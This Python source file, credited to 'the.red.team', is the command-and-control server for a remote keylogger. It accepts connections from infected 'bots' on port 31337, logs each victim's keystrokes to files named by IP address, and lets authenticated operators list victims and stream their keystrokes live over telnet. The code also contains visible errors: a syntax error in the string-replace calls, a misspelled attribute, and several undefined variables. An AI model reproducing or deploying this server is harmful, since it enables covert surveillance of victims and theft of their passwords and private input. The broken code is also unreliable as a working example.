############################################################################
#                                                                          #
# This python script serves as a callback server for the Remote Keylogger. #
#                                                                          #
# The keylogger will log keys and send them in real-time to this server    #
#                                                                          #
# via the port you specify in the code below. All keys will be stored in   #
#                                                                          #
# specifically named log files in the local file system. The server can    #
#                                                                          #
# also be accessed via telnet to monitor the real-time key streaming.      #
#                                                                          #
############################################################################
#                                                                          #
# Of course this server requires the actuall keylogger code which is       #
#                                                                          #
# written in C++. Without that custom written exe, this will not           #
#                                                                          #
# work. If you are receiving this from a source who understands how this   #
#                                                                          #
# works, hopefully they have included the setup file to create your own    #
#                                                                          #
# exe.                                                                     #
#                                                                          #
#                                                    -@the.red.team        #
#                                                                          #
############################################################################


import socket
import threading
import os
import os.path
import sys
import time
import select
import random
from datetime import datetime
from random import randint


# LISTS
logins = ['username:password'] #THIS IS WHERE YOUR ADMIN ACCOUNTS ARE
user_objects = [] # LIST TO HOLD OBJECTS WHEN THE USERS LOGIN
bot_objects = [] # LIST TO HOLD OBJECTS WHEN BOTS CONNECT



# GET THE ADMIN FILE READY IN CASE THERE IS NO ADMIN FILE YET
admin_file = open('ADMINS.txt', 'a')
admin_file.close()



# CLASSES FOR USERS AND BOTS
class UserProfile:
	uid = ''
	conn = None
	ip = ''

class BotProfile:
	uid = ''
	conn = None
	ip = ''

	# LIST FOR REAL-TIME KEY STREAMING
	stream = []



global dev
dev = ('                ----------Developed by: the.red.team | !help - List commands----------')







# FUNCTION TO START NETWORK CAPABILITIES ON THE SERVER
def socket_create():
	try:
		host = ''
		port = 31337 #THE PORT FOR THE BOTS TO CONNECT
		s = socket.socket()
		print('[!] Created first socket')
	except socket.error as msg:
		print('[!]Could not create socket: ' + str(msg))
	try:
		host2 = ''
		port2 = 12345 #THE PORT FOR THE USERS TO CONNECT. MAKE IT WHATEVER #CANNOT BE SAME AS BOT PORT#
		st = socket.socket()
		print('[!] Created second socket')
	except socket.error as msg:
		print('[!]Could not create socket 2: ' + str(msg))
	try:
		s.bind((host, port))
		s.listen(5)
		print('[!] Bound first socket')
	except socket.error as msg:
		print('[!]Could not bind socket: ' + str(msg) + "\n" + "Retrying...")
		sys.exit()
	try:
		st.bind((host2, port2))
		st.listen(5)
		print('[!] Bound second socket')
	except socket.error as msg:
		print('[!]Could not bind socket: ' + str(msg) + "\n" + "Retrying...")
		sys.exit()



# FUNCTION TO ALLOW THE CLIENT TO LOGIN TO THE SERVER
def login(obj):
	valid = False
	counte = 0
	attempts = 0
	print('[!] Login thread started')
	qui = False
	while valid == False and attempts < 4 and qui == False:
		br = False
		obj.conn.send(str.encode('login as: '))
		username = str(obj.conn.recv(1024).decode('ascii')).replace('\n', '').replace('\r', '')
		if username == '!exit':
			obj.conn.send(str.encode(''))
			qui = True
			obj.conn.close()
			continue
		obj.conn.send(str.encode('password: '))
		password = str(obj.conn.recv(1024).decode('ascii')).replace('\n', '').replace('\r', '')
		attempts = attempts + 1
		print('[!] Attempted: ' + str(attempts))
		cred = username + ':' + password
		cred = cred.replace('\n', '').replace('\r', '')
		with open('ADMINS.txt') as f:
			from_file = f.readlines()

		for line in from_file:
			if line.replace('\n', '') not in logins:
				logins.append(line)

		print('[!] Credentials presented: ' + cred)
		cont = False
		if cred in logins:
			print('[!] Successful ADMIN login')
			logn = open('login.txt', 'a')
			logn.write('[!] Successful Administrator login with ' + str(username) + ' from IP: ' + str(addr[0]) + '\n')
			logn.close()
			obj.conn.send(str.encode('Valid Administrator Login\n\n\n\n'))
			time.sleep(2)
			obj.conn.send(str.encode(chr(27) + "[2J"))


			# THE USER HAS OFFICIALLY LOGGED IN HERE
			obj.conn.send(str.encode('\n\n\t\t\t\t\tKey Logger Terminal\n\n' + dev + '\n\n'))
			print('[!] Sending to a clientHandler thread')
			valid = True
			if attempts < 5:
				obj.uid = str(username)
				user_objects.append(obj)
				print('[!] len(user_objects) -> ' + str(len(user_objects)))
				clientHandler(obj)
			break
		if attempts >= 4:
			attempts = 10
			obj.conn.send(str.encode('You have provided invalid credentials too many times. Connection will now close...\n'))
			obj.conn.close()
			break

		

# FUNCTION WHICH WILL RECEIVE KEY PRESSES FROM THE BOT
def botHandler(obj):

	# NAMING CONVENTION FOR KEYLOGS
	# EXAMPLE FILE NAME: 127_0_0_1_keylog.log
	file_name = str(obj.ip).replace('.', '_') + '_keylog.log'

	# WHILE LOOP WHICH WILL CONTINUE AS LONG AS THE CLIENT IS CONNECTED
	print('[!] Key monitor thread started')
	while True:


		# RECEIVE THE KEYS HERE
		try:
			kinder = str(obj.conn.recv(1024).decode('ascii')).replace('\r', '')
		except:
			break


		# LOG ALL KEY STROKES TO FILE
		file = open(file_name, 'a')
		file.write(kinder)
		file.close()


		# SEND THE KEYS TO ANY USERS WHO WANT TO SEE THEM IN REAL TIME
		for user in obj.stream:
			try:
				user.conn.send(str.encode('' + str(kinder) + ''))
			except:
				break
	print('[!] Stopping key monitor')
	bot_objects.remove(obj)



# USER INTERFACE
def clientHandler(obj):

	# HELP MENU FOR THE USER
	help = '!clear - Clear the screen\n'
	help = help + '!help - Display this menu\n'
	help = help + '!ID - List UIDs and IPs of connected bots\n'
	help = help + '!keyLog <bot id> - Stream bot key strokes in real time\n'
	help = help + '!keyLog stop <bot id> - Stop streaming bot key strokes in real time\n'
	help = help + '!exit - Exit your session\n'


	print('[!] Client handler started')


	# WHILE LOOP TO CONITNUOUSLY TAKE COMMANDS FROM USER
	# THIS WILL NOT EXIT UNLESS THE USER ENTERS '!exit' OR THE USER DISCONNECTS
	while 1:
		try:
			obj.conn.send(str.encode('[' + str(len(bot_objects)) + ']' + str(obj.uid) + '@KeyLogger> '))
			cmd = str(obj.conn.recv(1024).decode('ascii')).replace('\n', '').replace('\r', '')
			if cmd == '!ID':
				obj.conn.send(str.encode('[!] GETTING VICTIM IDs\n'))
				for bot in bot_objects:
					obj.conn.send(str.encode('Bot ID -> ' + str(bot.uid) + ' | IP -> ' + str(bot.ip)))
			elif cmd == '!clear':
				obj.conn.send(str.encode(chr(27) + "[2J"))
			elif cmd == '!help':
				obj.conn.send(str.encode(help))
			elif cmd == '!quit':
				obj.conn.close()
				user_objects.remove(obj)
				break


			# IF STATEMENT TO FIND OUT IF USER WANTS TO STREAM KEY PRESSES
			elif ('!keyLog ' in cmd) and ('stop' not in cmd):
				found = False

				id = cmd.replace(!keyLog ', '')
				for bot in bot_objects:
					if str(bot.uid) == id:
						target_bot = bot
						found = True
						break
				if found != True:
					obj.conn.send(str.encode('[!] Bot ID -> ' + str(id) + ' was not found\n'))
				else:
					if obj not in target_bot.steam:
						target_bot.stream.append(obj)
					else:
						obj.conn.send(str.encode('[!] You are already streaming keys from bot ' + str(target_bot.uid)))


			# IF STATEMENT TO FIND OUT IF USER WANTS TO STOP STREAMING KEY PRESSES
			elif '!keyLog stop ' in cmd:
				found = False

				id = cmd.replace(!keyLog stop ', '')
				for bot in bot_objects:
					if str(bot.uid) == id:
						target_bot = bot
						found = True
						break
				if found != True:
					obj.conn.send(str.encode('[!] Bot ID -> ' + str(id) + ' was not found\n'))
				else:
					if obj in target_bot.steam:
						target_bot.stream.remove(obj)
					else:
						obj.conn.send(str.encode('[!] You were not streaming keys from bot ' + str(target_bot.uid)))


		except:
			print('[!] Client disconnected: ' + username + '')
			try:
				user_objects.remove(obj)
			except:
				print('[!] Exception')
			break


# FUNCTION WHICH WILL ALLOW BOTS TO CONNECT TO THE SERVER
def accept_connections():
	print('[!] Waiting for CPP bot connections')
	while 1:

		# BUILD BOT OBJECT FROM CONNECTION
		obj = BotProfile()
		obj.conn, info = s.accept()
		obj.ip = str(info[0])
		obj.conn.setblocking(1)
		obj.uid = str(randint(10000, 99999))

		print('\n[+]CPP bot Connection established: ' + obj.ip)
		print('[!] Starting CPP bot login')

		bot_thread = threading.Thread(target = botHandler, args = (obj,))
		bot_thread.daemon = True
		bot_thread.start()

		bot_objects.append(obj)
		print('[!] len(bot_objects) -> ' + str(len(bot_objects)))

		time.sleep(0.5)


# FUNCTION WHICH WILL ALLOW USERS TO CONNECT TO THE SERVER
def accept_connections_2():
	while 1:

		# BUILD USER OBJECT FROM CONNECTION
		obj = UserProfile()
		obj.conn, info = st.accept()
		obj.ip = str(info[0])
		obj.conn.setblocking(1)

		print('\n[+]Client Connection established: ' + obj.ip)

		logn = open('login.txt', 'a')
		logn.write('[!] Got a user connection from: ' + str(clientAddress) + '\n')
		logn.close()

		print('[!] Starting login thread')
		user_thread = threading.Thread(target = clientHandler, args = (obj,))
		user_thread.daemon = True
		user_thread.start()

		time.sleep(0.5)


# FUNCTION TO KEEP THE SCRIPT FROM EXITING
def waiter():
	while 1:
		time.sleep(5)
	

# FIRING OFF ALL OF THE THREADS AND FUNCTIONS
try:

	# START NETWORK CAPABILITIES
	socket_create()

	# START ACCEPTING CONNECTIONS FROM BOTS
	t = threading.Thread(target=accept_connections)
	print('started thread ' + str(threadCount))
	t.daemon = True
	t.start()


	# START ACCEPTING CONNECTIONS FROM USERS
	a = threading.Thread(target=accept_connections_2)
	print('started thread ' + str(threadCount))
	a.daemon = True
	a.start()

	print('[!] Started all necessary threads')

	# KEEP ALIVE
	waiter()
except KeyboardInterrupt:
	lstn = False
	print('\n[!] Exit process starting...')
	print('[!] Closing connections...')
	for r, conn in enumerate(all_connections):
		try:
			print('[!] Closing connection: ' + str(r))
			down_server(conn)
		except:
			print('[CRITICAL] Could not kill connection: ' + str(r))
			print('[CRITICAL] You may experience problem upon next startup')
	for l, conn in enumerate(all_clients):
		try:
			print('[!] Closing client connection: ' + str(l))
			down_server(conn)
		except:
			print('[CRITICAL] Could not kill connection: ' + str(l))
			print('[CRITICAL] You may experience problem upon next startup')
	s.close()
	print('[!] Successfully closed all connections')
	print('[!] Exiting')
